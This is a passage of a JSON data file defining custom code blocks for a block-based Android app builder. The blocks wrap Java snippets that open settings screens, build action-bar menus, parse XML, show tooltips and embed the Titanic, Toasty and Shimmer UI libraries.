callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_MANAGE_ALL_APPLICATIONS_SETTINGS);\n            startActivity(callSettingIntent);\n","color":"#000000","name":"open app manager settings","typeName":"","palette":"85","type":" ","spec":"open app manager settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_NIGHT_DISPLAY_SETTINGS);\nstartActivity(callSettingIntent);","color":"#000000","name":"open night display settings","typeName":"","palette":"85","type":" ","spec":"open night display setings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_PRIVACY_SETTINGS);\nstartActivity(callSettingIntent);","color":"#000000","name":"open privacy/backup settings ","typeName":"","palette":"85","type":" ","spec":"open privacy/backup settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);\nstartActivity(callSettingIntent);","color":"#000000","name":"open security settings","typeName":"","palette":"85","type":" ","spec":"open security settings"},{"code":"String packageName;\npackageName \u003d %1$s;\ntry {\n    Intent intent \u003d new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);\n    intent.setData(Uri.parse(\"package:\" + packageName));\n    startActivity(intent);\n\n} catch ( ActivityNotFoundException e ) {\n    //e.printStackTrace(); \n    Intent intent \u003d new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);\n    startActivity(intent);\n}","color":"#17B978","name":"open any app details setting using pkg name","typeName":"","palette":"85","type":" ","spec":"open details setting for app %s 👈pkg name🇩🇿."},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_SOUND_SETTINGS);\nstartActivity(callSettingIntent);","color":"#000000","name":"open volume settings","typeName":"","palette":"85","type":" ","spec":"open Volume settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_VPN_SETTINGS);\nstartActivity(callSettingIntent);","color":"#204051","name":"open VPN settings ","typeName":"","palette":"85","type":" ","spec":"open VPN settings"},{"code":"Intent callSettingIntent\u003d new Intent(android.provider.Settings.ACTION_WEBVIEW_SETTINGS);\nstartActivity(callSettingIntent);","color":"#000000","name":"open settings choose webview","typeName":"","palette":"85","type":" ","spec":"open settings to choose default webview "},{"code":"","color":"#000000","name":"ADD ","typeName":"","palette":"131","type":"h","spec":"Add SPINER TO actionBar"},{"code":"}\r\n@Override\r\npublic boolean onCreateOptionsMenu(Menu menu){\r\n menu.add(%1$s);\r\n menu.add(%2$s);\n\n\r\n ","color":"#6F6F7F","name":"add spinner menu to action Bar","typeName":"","palette":"131","type":" ","spec":"Add spinner to ActionBar item1 %s item2 %s"},{"code":"menu.add(%1$s);","color":"#797979","name":"another item","typeName":"","palette":"131","type":" ","spec":"another item %s"},{"code":"return true;\r\n}\r\n\r\n@Override\r\npublic boolean onOptionsItemSelected(final MenuItem item){\r\n \r\n switch (item.getTitle().toString()) {\r","color":"#848484","name":"spinner actionBar ","typeName":"","palette":"131","type":" ","spec":"Put this after items and before action Click"},{"code":"case %1$s :\r\n%2$s\n","color":"#7F7F7F","name":"Spinner ActionBar onItemClicked","typeName":"","palette":"131","type":"c","spec":"if item %s get clicked then"},{"code":"return true;\r\n default: \r\n return super.onOptionsItemSelected(item);\r\n}","color":"#6B6B6B","name":"Spinner ActionBar Final Block","typeName":"","palette":"131","type":" ","spec":"Final Spinner ActionBar Block Show"},{"code":"try{\norg.xmlpull.v1.XmlPullParser %s\u003dandroid.util.Xml.newPullParser();\n%s\n}catch(Exception e){Toast.makeText(getApplicationContext(), e.getMessage(), Toast.LENGTH_LONG).show();}","color":"#FF00BFA5","typeName":"","name":"newPullParser","palette":"132","type":"c","spec":"%m.XmlPullParser newPullParser "},{"code":"%s.setInput(new java.io.FileInputStream(new java.io.File(%s)),null);","color":"#FF00BFA5","typeName":"","name":"setXmlInput","palette":"132","type":" ","spec":"%m.XmlPullParser setInput path %s "},{"code":"%s.getEventType()","color":"#FF00BFA5","typeName":"","name":"eventType","palette":"132","type":"d","spec":"%m.XmlPullParser getEventType"},{"code":"org.xmlpull.v1.XmlPullParser.%s","color":"#FF00BFA5","typeName":"","name":"switchEventType","palette":"132","type":"d","spec":"%m.EventType "},{"code":"%s.next()","color":"#FF00BFA5","typeName":"","name":"next","palette":"132","type":"d","spec":"%m.XmlPullParser next"},{"code":"%s.nextTag()","color":"#FF00BFA5","typeName":"","name":"nextTag","palette":"132","type":"d","spec":"%m.XmlPullParser nextTag"},{"code":"%s.nextText()","color":"#FF00BFA5","typeName":"","name":"nextText","palette":"132","type":"s","spec":"%m.XmlPullParser nextText"},{"code":"%s.getName()","color":"#FF00BFA5","typeName":"","name":"getName","palette":"132","type":"s","spec":"%m.XmlPullParser getName"},{"code":"%s.getText()","color":"#FF00BFA5","typeName":"","name":"getTextXml","palette":"132","type":"s","spec":"%m.XmlPullParser getText"},{"code":"%s.getAttributeCount()","color":"#FF00BFA5","typeName":"","name":"getAttributeCount","palette":"132","type":"d","spec":"%m.XmlPullParser getAttributeCount"},{"code":"%s.getAttributeName((int)%s)","color":"#FF00BFA5","typeName":"","name":"getAttributeName","palette":"132","type":"s","spec":"%m.XmlPullParser getAttributeName %d "},{"code":"%s.getAttributeValue((int)%s)","color":"#FF00BFA5","typeName":"","name":"getAttributeValue","palette":"132","type":"s","spec":"%m.XmlPullParser getAttributeValue %d "},{"code":"","color":"#6726B2","name":"tooltip head one","typeName":"","palette":"133","type":"h","spec":"These blocks created by Hussein @smith8h"},{"code":"ViewTooltip\n.on(this, %1$s)\n%2$s\n// blocks by Hussein @smith8h\n.show();","color":"#6726B2","name":"tooltip configuration","typeName":"","palette":"133","type":"c","spec":"Tooltip for %m.view"},{"code":".autoHide(%s, %s)\n.clickToHide(%s)","color":"#6726B2","name":"tooltip hide option","typeName":"","palette":"133","type":" ","spec":"Auto hide %b after %d ms, Click to hide %b"},{"code":".text(%s) // blocks by Hussein @smith8h","color":"#6726B2","name":"tooltip text","typeName":"","palette":"133","type":" ","spec":"Tooltip text %s"},{"code":".color(%s)\n.textColor(%s)\n.corner(%s)","color":"#6726B2","name":"tooltip colors corner","typeName":"","palette":"133","type":" ","spec":"Color %m.color Text color %m.color Corner %d"},{"code":".position(ViewTooltip.Position.%s)\n.arrowWidth(%s)\n.arrowHeight(%s)\n.distanceWithView(%s)","color":"#6726B2","name":"tooltip positions","typeName":"","palette":"133","type":" ","spec":"Position %s ArrowWidth %d ArrowHeight %d Distance with view %d"},{"code":".onDisplay(new ViewTooltip.ListenerDisplay() { @Override public void onDisplay(View view) {\n%s\n} })","color":"#6726B2","name":"on display tooltip","typeName":"","palette":"133","type":"c","spec":"onDisplay listener"},{"code":".onHide(new ViewTooltip.ListenerHide() { @Override public void onHide(View view) {\n%s\n} })","color":"#6726B2","name":"on hide tooltip","typeName":"","palette":"133","type":"c","spec":"onHide listener"},{"code":"","color":"#6726B2","name":"tooltip positions head","typeName":"","palette":"133","type":"h","spec":"Positions of Tooltip hint view"},{"code":"TOP","color":"#6726B2","name":"top position tooltip","typeName":"","palette":"133","type":"s","spec":"TOP Position"},{"code":"RIGHT","color":"#6726B2","name":"right position tooltip","typeName":"","palette":"133","type":"s","spec":"RIGHT Position"},{"code":"BOTTOM","color":"#6726B2","name":"bottom position tooltip","typeName":"","palette":"133","type":"s","spec":"BOTTOM Position"},{"code":"LEFT","color":"#6726B2","name":"left position tooltip","typeName":"","palette":"133","type":"s","spec":"LEFT Position"},{"code":"%1$s.getDrawable(). setColorFilter(Color.parseColor(\"%2$s\"), PorterDuff.Mode.SRC_IN);","color":"#FF2196F3","name":"icon cor","typeName":"","palette":"127","type":" ","spec":"%m.imageview  Icon Set Color %s.inputOnly "},{"code":"\n}\n\n\npublic class Titanic {\n\n    private AnimatorSet animatorSet;\n    private Animator.AnimatorListener animatorListener;\n\n    public Animator.AnimatorListener getAnimatorListener() {\n        return animatorListener;\n    }\n\n    public void setAnimatorListener(Animator.AnimatorListener animatorListener) {\n        this.animatorListener \u003d animatorListener;\n    }\n\n    public void start(final TitanicTextView textView) {\n\n        final Runnable animate \u003d new Runnable() {\n            @Override\n            public void run() {\n\n                textView.setSinking(true);\n\n                // horizontal animation. 200 \u003d wave.png width\n                ObjectAnimator maskXAnimator \u003d ObjectAnimator.ofFloat(textView, \"maskX\", 0, 200);\n                maskXAnimator.setRepeatCount(ValueAnimator.INFINITE);\n                maskXAnimator.setDuration(1000);\n                maskXAnimator.setStartDelay(0);\n\n                int h \u003d textView.getHeight();\n\n                // vertical animation\n                // maskY \u003d 0 -\u003e wave vertically centered\n                // repeat mode REVERSE to go back and forth\n                ObjectAnimator maskYAnimator \u003d ObjectAnimator.ofFloat(textView, \"maskY\", h/2, - h/2);\n                maskYAnimator.setRepeatCount(ValueAnimator.INFINITE);\n                maskYAnimator.setRepeatMode(ValueAnimator.REVERSE);\n                maskYAnimator.setDuration(10000);\n                maskYAnimator.setStartDelay(0);\n\n                // now play both animations together\n                animatorSet \u003d new AnimatorSet();\n                animatorSet.playTogether(maskXAnimator, maskYAnimator);\n                animatorSet.setInterpolator(new LinearInterpolator());\n                animatorSet.addListener(new Animator.AnimatorListener() {\n                    @Override\n                    public void onAnimationStart(Animator animation) {\n                    }\n\n                    @Override\n                    public void onAnimationEnd(Animator animation) {\n                        textView.setSinking(false);\n\n                        if (Build.VERSION.SDK_INT \u003c Build.VERSION_CODES.JELLY_BEAN) {\n                            textView.postInvalidate();\n                        } else {\n                            textView.postInvalidateOnAnimation();\n                        }\n\n                        animatorSet \u003d null;\n                    }\n\n                    @Override\n                    public void onAnimationCancel(Animator animation) {\n\n                    }\n\n                    @Override\n                    public void onAnimationRepeat(Animator animation) {\n\n                    }\n                });\n\n\n                if (animatorListener !\u003d null) {\n                    animatorSet.addListener(animatorListener);\n                }\n\n                animatorSet.start();\n            }\n        };\n\n        if (!textView.isSetUp()) {\n            textView.setAnimationSetupCallback(new AnimationSetupCallback() {\n                @Override\n                public void onSetupAnimation(final TitanicTextView target) {\n                    animate.run();\n                }\n            });\n        } else {\n            animate.run();\n        }\n    }\n\n    public void cancel() {\n        if (animatorSet !\u003d null) {\n            animatorSet.cancel();\n        }\n    }\n}\n\n\npublic interface AnimationSetupCallback {\n        public void onSetupAnimation(TitanicTextView titanicTextView);\n    }\n\n\npublic class TitanicTextView extends TextView {\n    // callback fired at first onSizeChanged\n    private AnimationSetupCallback animationSetupCallback;\n    // wave shader coordinates\n    private float maskX, maskY;\n    // if true, the shader will display the wave\n    private boolean sinking;\n    // true after the first onSizeChanged\n    private boolean setUp;\n\n    // shader containing a repeated wave\n    private BitmapShader shader;\n    // shader matrix\n    private Matrix shaderMatrix;\n    // wave drawable\n    private android.graphics.drawable.Drawable wave;\n    // (getHeight() - waveHeight) / 2\n    private float offsetY;\n\n    public TitanicTextView(Context context) {\n        super(context);\n        init();\n    }\n\n    public TitanicTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        init();\n    }\n\n    public TitanicTextView(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        init();\n    }\n\n    private void init() {\n        shaderMatrix \u003d new Matrix();\n    }\n\n    public AnimationSetupCallback getAnimationSetupCallback() {\n        return animationSetupCallback;\n    }\n\n    public void setAnimationSetupCallback(AnimationSetupCallback animationSetupCallback) {\n        this.animationSetupCallback \u003d animationSetupCallback;\n    }\n\n    public float getMaskX() {\n        return maskX;\n    }\n\n    public void setMaskX(float maskX) {\n        this.maskX \u003d maskX;\n        invalidate();\n    }\n\n    public float getMaskY() {\n        return maskY;\n    }\n\n    public void setMaskY(float maskY) {\n        this.maskY \u003d maskY;\n        invalidate();\n    }\n\n    public boolean isSinking() {\n        return sinking;\n    }\n\n    public void setSinking(boolean sinking) {\n        this.sinking \u003d sinking;\n    }\n\n    public boolean isSetUp() {\n        return setUp;\n    }\n\n    @Override\n    public void setTextColor(int color) {\n        super.setTextColor(color);\n        createShader();\n    }\n\n    @Override\n    public void setTextColor(android.content.res.ColorStateList colors) {\n        super.setTextColor(colors);\n        createShader();\n    }\n\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n\n        createShader();\n\n        if (!setUp) {\n            setUp \u003d true;\n            if (animationSetupCallback !\u003d null) {\n                animationSetupCallback.onSetupAnimation(TitanicTextView.this);\n            }\n        }\n    }\n\n    /**\n     * Create the shader\n     * draw the wave with current color for a background\n     * repeat the bitmap horizontally, and clamp colors vertically\n     */\n    @SuppressWarnings(\"deprecation\")\n    private void createShader() {\n\n        if (wave \u003d\u003d null) {\n            wave \u003d getResources().getDrawable(R.drawable.wave);\n        }\n\n        int waveW \u003d wave.getIntrinsicWidth();\n        int waveH \u003d wave.getIntrinsicHeight();\n\n        Bitmap b \u003d Bitmap.createBitmap(waveW, waveH, Bitmap.Config.ARGB_8888);\n        Canvas c \u003d new Canvas(b);\n\n        c.drawColor(getCurrentTextColor());\n\n        wave.setBounds(0, 0, waveW, waveH);\n        wave.draw(c);\n\n        shader \u003d new BitmapShader(b, Shader.TileMode.REPEAT, Shader.TileMode.CLAMP);\n        getPaint().setShader(shader);\n\n        offsetY \u003d (getHeight() - waveH) / 2;\n \n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n\n        // modify text paint shader according to sinking state\n        if (sinking \u0026\u0026 shader !\u003d null) {\n\n            // first call after sinking, assign it to our paint\n            if (getPaint().getShader() \u003d\u003d null) {\n                getPaint().setShader(shader);\n            }\n\n            // translate shader accordingly to maskX maskY positions\n            // maskY is affected by the offset to vertically center the wave\n            shaderMatrix.setTranslate(maskX, maskY + offsetY);\n\n            // assign matrix to invalidate the shader\n            shader.setLocalMatrix(shaderMatrix);\n        } else {\n            getPaint().setShader(null);\n        }\n\n        super.onDraw(canvas);\n    }\n}\n\npublic void nothing() {\n","color":"#FF00BCD4","name":"Titanic TextView","typeName":"","palette":"128","type":" ","spec":"Titanic textview library"},{"code":"","color":"#FFFFA000","name":"","typeName":"","palette":"134","type":"h","spec":"Added By Kurdish Team ( Amin Samad )"},{"code":"\n\n\nfinal static class ToastyUtils {\n    private ToastyUtils() {\n    }\n\n    static android.graphics.drawable.Drawable tintIcon(android.graphics.drawable.Drawable drawable, int tintColor) {\n        drawable.setColorFilter(tintColor, PorterDuff.Mode.SRC_IN);\n        return drawable;\n    }\n\n    static android.graphics.drawable.Drawable tint9PatchDrawableFrame(Context context, int tintColor) {\n        final android.graphics.drawable.NinePatchDrawable toastDrawable \u003d (android.graphics.drawable.NinePatchDrawable) getDrawable(context, R.drawable.toast_frame);\n        return tintIcon(toastDrawable, tintColor);\n    }\n\n    static void setBackground(View view, android.graphics.drawable.Drawable drawable) {\n        if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.JELLY_BEAN)\n            view.setBackground(drawable);\n        else\n            view.setBackgroundDrawable(drawable);\n    }\n\n    static android.graphics.drawable.Drawable getDrawable(Context context, int id) {\n        if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.LOLLIPOP)\n            return context.getDrawable(id);\n        else\n            return context.getResources().getDrawable(id);\n    }\n}\n\n\n\n\n\npublic static class Toasty {\n    \n    private static int DEFAULT_TEXT_COLOR \u003d Color.parseColor(\"#FFFFFF\");\n    \n    private static int ERROR_COLOR \u003d Color.parseColor(\"#D50000\");\n    \n    private static int INFO_COLOR \u003d Color.parseColor(\"#3F51B5\");\n    \n    private static int SUCCESS_COLOR \u003d Color.parseColor(\"#388E3C\");\n    \n    private static int WARNING_COLOR \u003d Color.parseColor(\"#FFA900\");\n    \n    private static int NORMAL_COLOR \u003d Color.parseColor(\"#353A3E\");\n\n    private static final Typeface LOADED_TOAST_TYPEFACE \u003d Typeface.create(\"sans-serif-condensed\", Typeface.NORMAL);\n    private static Typeface currentTypeface \u003d LOADED_TOAST_TYPEFACE;\n    private static int textSize \u003d 16; // in SP\n\n    private static boolean tintIcon \u003d true;\n\n    private Toasty() {\n        // avoiding instantiation\n    }\n\n\n    public static Toast normal(Context context, CharSequence message) {\n        return normal(context, message, Toast.LENGTH_SHORT, null, false);\n    }\n\n    \n    public static Toast normal(Context context, CharSequence message, android.graphics.drawable.Drawable icon) {\n        return normal(context, message, Toast.LENGTH_SHORT, icon, true);\n    }\n\n    public static Toast normal(Context context, CharSequence message, int duration) {\n        return normal(context, message, duration, null, false);\n    }\n\n\n    public static Toast normal(Context context, CharSequence message, int duration,\n                               android.graphics.drawable.Drawable icon) {\n        return normal(context, message, duration, icon, true);\n    }\n\n\n    public static Toast normal(Context context, CharSequence message, int duration,\n                               android.graphics.drawable.Drawable icon, boolean withIcon) {\n        return custom(context, message, icon, NORMAL_COLOR, duration, withIcon, true);\n    }\n\n\n    public static Toast warning(Context context, CharSequence message) {\n        return warning(context, message, Toast.LENGTH_SHORT, true);\n    }\n    \n\n    public static Toast warning(Context context, CharSequence message, int duration) {\n        return warning(context, message, duration, true);\n    }\n\n    public static Toast warning(Context context, CharSequence message, int duration, boolean withIcon) {\n        return custom(context, message, ToastyUtils.getDrawable(context, R.drawable.ic_error_outline_white_48dp),\n                WARNING_COLOR, duration, withIcon, true);\n    }\n\n    public static Toast info(Context context, CharSequence message) {\n        return info(context, message, Toast.LENGTH_SHORT, true);\n    }\n\n    \n    public static Toast info(Context context, CharSequence message, int duration) {\n        return info(context, message, duration, true);\n    }\n\n\n    public static Toast info(Context context, CharSequence message, int duration, boolean withIcon) {\n        return custom(context, message, ToastyUtils.getDrawable(context, R.drawable.ic_info_outline_white_48dp),\n                INFO_COLOR, duration, withIcon, true);\n    }\n\n     \n    public static Toast success(Context context, CharSequence message) {\n        return success(context, message, Toast.LENGTH_SHORT, true);\n    }\n\n     \n    public static Toast success(Context context, CharSequence message, int duration) {\n        return success(context, message, duration, true);\n    }\n\n     \n    public static Toast success(Context context, CharSequence message, int duration, boolean withIcon) {\n        return custom(context, message, ToastyUtils.getDrawable(context, R.drawable.ic_check_white_48dp),\n               SUCCESS_COLOR, duration, withIcon, true);\n    }\n\n     \n    public static Toast error(Context context, CharSequence message) {\n        return error(context, message, Toast.LENGTH_SHORT, true);\n    }\n\n     \n    public static Toast error(Context context, CharSequence message, int duration) {\n        return error(context, message, duration, true);\n    }\n\n     \n    public static Toast error(Context context, CharSequence message, int duration, boolean withIcon) {\n        return custom(context, message, ToastyUtils.getDrawable(context, R.drawable.ic_clear_white_48dp),\n                ERROR_COLOR, duration, withIcon, true);\n    }\n\n     \n    public static Toast custom(Context context, CharSequence message, android.graphics.drawable.Drawable icon,\n                               int duration, boolean withIcon) {\n        return custom(context, message, icon, -1, duration, withIcon, false);\n    }\n\n     \n    public static Toast custom(Context context, CharSequence message, int iconRes,\n                               int tintColor, int duration,\n                               boolean withIcon, boolean shouldTint) {\n        return custom(context, message, ToastyUtils.getDrawable(context, iconRes),\n                tintColor, duration, withIcon, shouldTint);\n    }\n\n     \n    public static Toast custom(Context context, CharSequence message, android.graphics.drawable.Drawable icon,\n                               int tintColor, int duration,\n                               boolean withIcon, boolean shouldTint) {\n        final Toast currentToast \u003d new Toast(context);\n        final View toastLayout \u003d ((LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE))\n                .inflate(R.layout.toast_layout, null);\n        final ImageView toastIcon \u003d (ImageView) toastLayout.findViewById(R.id.toast_icon);\n        final TextView toastTextView \u003d (TextView) toastLayout.findViewById(R.id.toast_text);\n        android.graphics.drawable.Drawable drawableFrame;\n\n        if (shouldTint)\n            drawableFrame \u003d ToastyUtils.tint9PatchDrawableFrame(context, tintColor);\n        else\n            drawableFrame \u003d ToastyUtils.getDrawable(context, R.drawable.toast_frame);\n        ToastyUtils.setBackground(toastLayout, drawableFrame);\n\n        if (withIcon) {\n            if (icon \u003d\u003d null)\n                throw new IllegalArgumentException(\"Avoid passing \u0027icon\u0027 as null if \u0027withIcon\u0027 is set to true\");\n            if (tintIcon)\n                icon \u003d ToastyUtils.tintIcon(icon, DEFAULT_TEXT_COLOR);\n            ToastyUtils.setBackground(toastIcon, icon);\n        } else {\n            toastIcon.setVisibility(View.GONE);\n        }\n\n        toastTextView.setText(message);\n        toastTextView.setTextColor(DEFAULT_TEXT_COLOR);\n        toastTextView.setTypeface(currentTypeface);\n        toastTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, textSize);\n\n        currentToast.setDuration(duration);\n        currentToast.setView(toastLayout);\n        return currentToast;\n    }\n\n    public static class Config {\n        \n        private int DEFAULT_TEXT_COLOR \u003d Toasty.DEFAULT_TEXT_COLOR;\n        \n        private int ERROR_COLOR \u003d Toasty.ERROR_COLOR;\n        \n        private int INFO_COLOR \u003d Toasty.INFO_COLOR;\n        \n        private int SUCCESS_COLOR \u003d Toasty.SUCCESS_COLOR;\n        \n        private int WARNING_COLOR \u003d Toasty.WARNING_COLOR;\n\n        private Typeface typeface \u003d Toasty.currentTypeface;\n        private int textSize \u003d Toasty.textSize;\n\n        private boolean tintIcon \u003d Toasty.tintIcon;\n\n        private Config() {\n            // avoiding instantiation\n        }\n\n         \n        public static Config getInstance() {\n            return new Config();\n        }\n\n        public static void reset() {\n            Toasty.DEFAULT_TEXT_COLOR \u003d Color.parseColor(\"#FFFFFF\");\n            Toasty.ERROR_COLOR \u003d Color.parseColor(\"#D50000\");\n            Toasty.INFO_COLOR \u003d Color.parseColor(\"#3F51B5\");\n            Toasty.SUCCESS_COLOR \u003d Color.parseColor(\"#388E3C\");\n            Toasty.WARNING_COLOR \u003d Color.parseColor(\"#FFA900\");\n            Toasty.currentTypeface \u003d LOADED_TOAST_TYPEFACE;\n            Toasty.textSize \u003d 16;\n            Toasty.tintIcon \u003d true;\n        }\n\n         \n        public Config setTextColor(int textColor) {\n            DEFAULT_TEXT_COLOR \u003d textColor;\n            return this;\n        }\n\n         \n        public Config setErrorColor(int errorColor) {\n            ERROR_COLOR \u003d errorColor;\n            return this;\n        }\n\n         \n        public Config setInfoColor(int infoColor) {\n            INFO_COLOR \u003d infoColor;\n            return this;\n        }\n\n         \n        public Config setSuccessColor(int successColor) {\n            SUCCESS_COLOR \u003d successColor;\n            return this;\n        }\n\n         \n        public Config setWarningColor(int warningColor) {\n            WARNING_COLOR \u003d warningColor;\n            return this;\n        }\n\n         \n        public Config setToastTypeface(Typeface typeface) {\n            this.typeface \u003d typeface;\n            return this;\n        }\n\n         \n        public Config setTextSize(int sizeInSp) {\n            this.textSize \u003d sizeInSp;\n            return this;\n        }\n\n         \n        public Config tintIcon(boolean tintIcon) {\n            this.tintIcon \u003d tintIcon;\n            return this;\n        }\n\n        public void apply() {\n            Toasty.DEFAULT_TEXT_COLOR \u003d DEFAULT_TEXT_COLOR;\n            Toasty.ERROR_COLOR \u003d ERROR_COLOR;\n            Toasty.INFO_COLOR \u003d INFO_COLOR;\n            Toasty.SUCCESS_COLOR \u003d SUCCESS_COLOR;\n            Toasty.WARNING_COLOR \u003d WARNING_COLOR;\n            Toasty.currentTypeface \u003d typeface;\n            Toasty.textSize \u003d textSize;\n            Toasty.tintIcon \u003d tintIcon;\n        }\n    }\n}\n\n","color":"#FF00BCD4","name":"Toasty Library","typeName":"","palette":"80","type":" ","spec":"Toasty Library"},{"code":"final ShimmerTextView b \u003d new ShimmerTextView(this);\n\nb.setText(%1$s);\nb.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));\nb.setTextSize(%2$s);\nb.setTextColor(Color.parseColor(\"%3$s\"));\nb.setTypeface(Typeface.createFromAsset(getAssets(),\"fonts/%4$s.ttf\"),0);\n%5$s.addView(b);\n\n\n\n\nfinal Shimmer shimmer \u003d new Shimmer();\nshimmer.start(b);","color":"#FFFFA000","name":"shimmer","typeName":"","palette":"134","type":" ","spec":"Shimmer SetText %s  TextSize %d TextColor %s.inputOnly  FontName %s.inputOnly View %m.view "},{"code":"public interface ShimmerViewBase {\n\n    public float getGradientX();\n    public void setGradientX(float gradientX);\n    public boolean isShimmering();\n    public void setShimmering(boolean isShimmering);\n    public boolean isSetUp();\n    public void setAnimationSetupCallback(ShimmerViewHelper.AnimationSetupCallback callback);\n    public int getPrimaryColor();\n    public void setPrimaryColor(int primaryColor);\n    public int getReflectionColor();\n    public void setReflectionColor(int reflectionColor);\n}\n\n\n\npublic static class ShimmerViewHelper {\n\n    public interface AnimationSetupCallback {\n        void onSetupAnimation(View target);\n    }\n\n    private static final int DEFAULT_REFLECTION_COLOR \u003d 0xFFFFFFFF;\n\n    private View view;\n    private Paint paint;\n\n    // center position of the gradient\n    private float gradientX;\n\n    // shader applied on the text view\n    // only null until the first global layout\n    private LinearGradient linearGradient;\n\n    // shader\u0027s local matrix\n    // never null\n    private Matrix linearGradientMatrix;\n\n    private int primaryColor;\n\n    // shimmer reflection color\n    private int reflectionColor;\n\n    // true when animating\n    private boolean isShimmering;\n\n    // true after first global layout\n    private boolean isSetUp;\n\n    // callback called after first global layout\n    private AnimationSetupCallback callback;\n\n    public ShimmerViewHelper(View view, Paint paint, AttributeSet attributeSet) {\n        this.view \u003d view;\n        this.paint \u003d paint;\n        init(attributeSet);\n    }\n\n    public float getGradientX() {\n        return gradientX;\n    }\n\n    public void setGradientX(float gradientX) {\n        this.gradientX \u003d gradientX;\n        view.invalidate();\n    }\n\n    public boolean isShimmering() {\n        return isShimmering;\n    }\n\n    public void setShimmering(boolean isShimmering) {\n        this.isShimmering \u003d isShimmering;\n    }\n\n    public boolean isSetUp() {\n        return isSetUp;\n    }\n\n    public void setAnimationSetupCallback(AnimationSetupCallback callback) {\n        this.callback \u003d callback;\n    }\n\n    public int getPrimaryColor() {\n        return primaryColor;\n    }\n\n    public void setPrimaryColor(int primaryColor) {\n        this.primaryColor \u003d primaryColor;\n        if (isSetUp) {\n            resetLinearGradient();\n        }\n    }\n\n    public int getReflectionColor() {\n        return reflectionColor;\n    }\n\n    public void setReflectionColor(int reflectionColor) {\n        this.reflectionColor \u003d reflectionColor;\n        if (isSetUp) {\n            resetLinearGradient();\n        }\n    }\n\n    private void init(AttributeSet attributeSet) {\n\n        reflectionColor \u003d DEFAULT_REFLECTION_COLOR;\n\n        if (attributeSet !\u003d null) {\n            /*\n            TypedArray a \u003d view.getContext().obtainStyledAttributes(attributeSet, R.styleable.ShimmerView, 0, 0);\n            if (a !\u003d null) {\n                try {\n                    reflectionColor \u003d a.getColor(R.styleable.ShimmerView_reflectionColor, DEFAULT_REFLECTION_COLOR);\n                } catch (Exception e) {\n                    android.util.Log.e(\"ShimmerTextView\", \"Error while creating the view:\", e);\n                } finally {\n                    a.recycle();\n                }\n            }\n            */\n            reflectionColor \u003d DEFAULT_REFLECTION_COLOR;\n        }\n\n        linearGradientMatrix \u003d new Matrix();\n    }\n\n    private void resetLinearGradient() {\n\n        // our gradient is a simple linear gradient from textColor to reflectionColor. its axis is at the center\n        // when it\u0027s outside of the view, the outer color (textColor) will be repeated (Shader.TileMode.CLAMP)\n        // initially, the linear gradient is positioned on the left side of the view\n        linearGradient \u003d new LinearGradient(-view.getWidth(), 0, 0, 0,\n                new int[]{\n                        primaryColor,\n                        reflectionColor,\n                        primaryColor,\n                },\n                new float[]{\n                        0,\n                        0.5f,\n                        1\n                },\n                Shader.TileMode.CLAMP\n        );\n\n        paint.setShader(linearGradient);\n    }\n\n    protected void onSizeChanged() {\n\n        resetLinearGradient();\n\n        if (!isSetUp) {\n            isSetUp \u003d true;\n\n            if (callback !\u003d null) {\n                callback.onSetupAnimation(view);\n            }\n        }\n    }\n\n    /**\n     * content of the wrapping view\u0027s onDraw(Canvas)\n     * MUST BE CALLED BEFORE SUPER STATEMENT\n     */\n    public void onDraw() {\n\n        // only draw the shader gradient over the text while animating\n        if (isShimmering) {\n\n            // first onDraw() when shimmering\n            if (paint.getShader() \u003d\u003d null) {\n                paint.setShader(linearGradient);\n            }\n\n            // translate the shader local matrix\n            linearGradientMatrix.setTranslate(2 * gradientX, 0);\n\n            // this is required in order to invalidate the shader\u0027s position\n            linearGradient.setLocalMatrix(linearGradientMatrix);\n\n        } else {\n            // we\u0027re not animating, remove the shader from the paint\n            paint.setShader(null);\n        }\n\n    }\n}\n\n\npublic class ShimmerTextView extends TextView implements ShimmerViewBase {\n\n    private ShimmerViewHelper shimmerViewHelper;\n\n    public ShimmerTextView(Context context) {\n        super(context);\n        shimmerViewHelper \u003d new ShimmerViewHelper(this, getPaint(), null);\n        shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n    }\n\n    public ShimmerTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        shimmerViewHelper \u003d new ShimmerViewHelper(this, getPaint(), attrs);\n        shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n    }\n\n    public ShimmerTextView(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        shimmerViewHelper \u003d new ShimmerViewHelper(this, getPaint(), attrs);\n        shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n    }\n\n    @Override\n    public float getGradientX() {\n        return shimmerViewHelper.getGradientX();\n    }\n\n    @Override\n    public void setGradientX(float gradientX) {\n        shimmerViewHelper.setGradientX(gradientX);\n    }\n\n    @Override\n    public boolean isShimmering() {\n        return shimmerViewHelper.isShimmering();\n    }\n\n    @Override\n    public void setShimmering(boolean isShimmering) {\n        shimmerViewHelper.setShimmering(isShimmering);\n    }\n\n    @Override\n    public boolean isSetUp() {\n        return shimmerViewHelper.isSetUp();\n    }\n\n    @Override\n    public void setAnimationSetupCallback(ShimmerViewHelper.AnimationSetupCallback callback) {\n        shimmerViewHelper.setAnimationSetupCallback(callback);\n    }\n\n    @Override\n    public int getPrimaryColor() {\n        return shimmerViewHelper.getPrimaryColor();\n    